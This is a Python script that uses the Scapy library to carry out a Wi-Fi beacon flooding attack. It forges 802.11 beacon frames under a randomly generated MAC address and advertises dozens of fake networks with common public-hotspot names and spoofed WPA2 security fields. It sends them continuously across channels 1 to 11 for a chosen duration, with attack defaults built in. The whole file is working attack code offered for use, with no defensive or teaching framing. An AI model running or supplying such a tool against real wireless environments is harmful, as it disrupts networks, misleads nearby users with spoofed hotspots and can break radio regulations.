import sys
import time
import random
import argparse
from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt

FAKE_NETWORKS = [
    "FreeWiFi", "PublicHotspot", "Guest_Network", "Airport_WiFi", 
    "CoffeeShop", "Hotel_Guest", "Default_SSID", "OpenNetwork", 
    "PublicAccess", "FreeInternet", "WebConnect", "WiFi-Hotspot",
    "Connect_Here", "Internet_Access", "PublicWLAN", "WiFi_Zone",
    "Network", "Wireless", "WiFi", "Hotspot", "Free_WiFi", 
    "Public_WiFi", "Open_WiFi", "WiFi_Access", "Internet"
]

def argument_handler():
    try:
        global interface,num_beacons,delay,seconds

        # initialize parser
        parser = argparse.ArgumentParser()

        # Adding optional argument
        parser.add_argument("-i","--Interface", help = "Enter wlan interface")
        parser.add_argument("-b", "--Beacons", type=int, help="Enter number of beacons")
        parser.add_argument("-d", "--Delay", type=float, help="Enter delay between every sending")
        parser.add_argument("-s", "--Seconds", type=int, help="Enter number of seconds for attack duration")

        # read arguments from command line
        args = parser.parse_args()

        # check wich arguments written
        if args.Interface:
            interface = args.Interface
        else:
            print("Enter wlan interface to work with")
            sys.exit(1)
        if args.Beacons:
            num_beacons = args.Beacons
        if args.Delay:
            delay = args.Delay
        if args.Seconds:
            seconds = args.Seconds

    except argparse.ArgumentError as e:
        print('Catching an argumentError, ' + e)

def generate_random_mac():
    """Generate a random MAC address."""
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def send_beacon_frames(interface, num_beacons, delay, duration):
    """
    Send multiple beacon frames to simulate a beacon flooding attack.
    """
    src_mac = generate_random_mac()
    
    # Select a fixed number of networks to make constant beacons for
    if num_beacons > len(FAKE_NETWORKS):
        # Use all available network names
        networks = FAKE_NETWORKS.copy()
        # Add some with random numbers to get to the desired count
        for i in range(len(FAKE_NETWORKS), num_beacons):
            networks.append(f"{random.choice(FAKE_NETWORKS)}_{random.randint(1, 999)}")
    else:
        networks = FAKE_NETWORKS[:num_beacons]
    
    # Generate beacon frames for each network
    frames = []
    channels = []
    
    print(f"Creating {num_beacons} fake networks with MAC {src_mac}...")
    
    for i, network in enumerate(networks):
        # Use a fixed channel for each network for better visibility
        channel = (i % 11) + 1
        channels.append(channel)
        
        # Create a beacon frame
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", 
                      addr2=src_mac, addr3=src_mac)
        
        # Create beacon layer with more complete capabilities
        beacon = Dot11Beacon(cap='ESS+privacy')
        
        # Add SSID, supported rates, channel and additional information
        essid = Dot11Elt(ID='SSID', info=network, len=len(network))
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        dsset = Dot11Elt(ID='DSset', info=chr(channel).encode())
        
        # Add RSN (802.11i) for WPA2 appearance
        rsn = Dot11Elt(ID=48, info=(
            b'\x01\x00'              # RSN Version 1
            b'\x00\x0f\xac\x04'      # Group Cipher Suite : CCMP (AES)
            b'\x01\x00'              # 1 Pairwise Cipher Suite
            b'\x00\x0f\xac\x04'      # Pairwise Cipher Suite : CCMP (AES)
            b'\x01\x00'              # 1 Authentication Key Management Suite
            b'\x00\x0f\xac\x02'      # Authentication Key Management : PSK
            b'\x00\x00'              # RSN Capabilities
        ))
        
        # Create the frame
        frame = RadioTap()/dot11/beacon/essid/rates/dsset/rsn
        frames.append(frame)
        
        print(f"[{i+1}/{num_beacons}] Created beacon for: {network} on channel {channel}")
    
    print(f"\nBroadcasting {num_beacons} fake networks for {duration} seconds...")
    print("Networks should now be visible on your phone's WiFi scanner.")
    
    # Send beacons continuously for the specified duration
    start_time = time.time()
    count = 0
    
    try:
        while time.time() - start_time < duration:
            for i, frame in enumerate(frames):
                sendp(frame, iface=interface, verbose=0)
                count += 1
                
                # Every 1000 packets, show progress
                if count % 1000 == 0:
                    elapsed = time.time() - start_time
                    remaining = max(0, duration - elapsed)
                    print(f"Sent {count} beacons. {remaining:.1f}s remaining...")
                
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\nStopped by user.")
    
    total_sent = count
    print(f"\nSent {total_sent} beacon frames for {num_beacons} fake networks")

if __name__ == "__main__":

    # default parameters for an attack if no additional optional 
    delay = 0.01
    seconds = 60
    num_beacons = 25

    interface = ''
    argument_handler()
    
    send_beacon_frames(interface, num_beacons, delay, seconds)